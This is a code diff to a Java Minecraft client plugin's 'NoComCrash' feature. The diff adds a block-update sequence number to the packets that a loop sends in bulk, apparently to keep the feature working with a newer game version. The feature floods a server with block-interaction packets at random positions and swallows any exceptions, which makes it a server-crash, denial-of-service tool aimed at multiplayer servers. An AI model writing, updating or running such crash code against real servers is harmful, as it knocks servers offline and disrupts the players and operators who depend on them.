@@ -1,6 +1,7 @@
 package me.dustin.crash.feature;
 
 import me.dustin.crash.CrashPlugin;
+import me.dustin.crash.mixin.interf.IWorldClient;
 import me.dustin.events.core.EventListener;
 import me.dustin.events.core.annotate.EventPointer;
 import me.dustin.jex.event.filters.PlayerPacketsFilter;
@@ -39,7 +40,8 @@ public class NoComCrash extends Feature {
         try {
             for (int i = 0; i < packetCount; i++) {
                 Vec3d cpos = pickRandomPos();
-                PlayerInteractBlockC2SPacket packet = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(cpos, Direction.DOWN, new BlockPos(cpos), false));
+                int sequence = ((IWorldClient)Wrapper.INSTANCE.getWorld()).getPendingUpdateManager().incrementSequence().getSequence();
+                PlayerInteractBlockC2SPacket packet = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(cpos, Direction.DOWN, new BlockPos(cpos), false), sequence);
                 NetworkHelper.INSTANCE.sendPacket(packet);
             }
         } catch (Exception ignored) {
